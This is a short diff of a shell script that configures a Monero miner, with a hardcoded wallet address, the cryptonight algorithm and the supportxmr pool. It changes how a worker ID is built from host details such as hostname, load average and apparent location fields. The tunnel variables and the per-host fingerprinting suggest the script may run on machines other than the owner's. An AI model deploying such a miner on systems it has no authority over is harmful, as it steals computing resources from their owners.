@@ -39,10 +39,10 @@ else
 fi
 
 ## instance ID
-CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
+# CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
 CORES=$(nproc || grep -c "cpu cores" < /proc/cpuinfo)
 parse_ip
-IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
+# IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
 HOSTN="$(echo $HOSTNAME | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity
 
 ## L3 cache size to multihash factor
@@ -118,8 +118,9 @@ export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
        PAUSD_RATE=${PAUSD_RATE:-200}
 
 ## vars for the object config
+read loadavg < /proc/loadavg
 export \
-ID=${ID:-"{$IPADDR}{$HOSTN}{$CORES}{$CPU}"} \
+ID=${ID:-"{$ip}{$country}{$region}{$HOSTN}{${ENDPOINT:-$TNL_LISTEN_TARGET}{${loadavg// /|}}}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
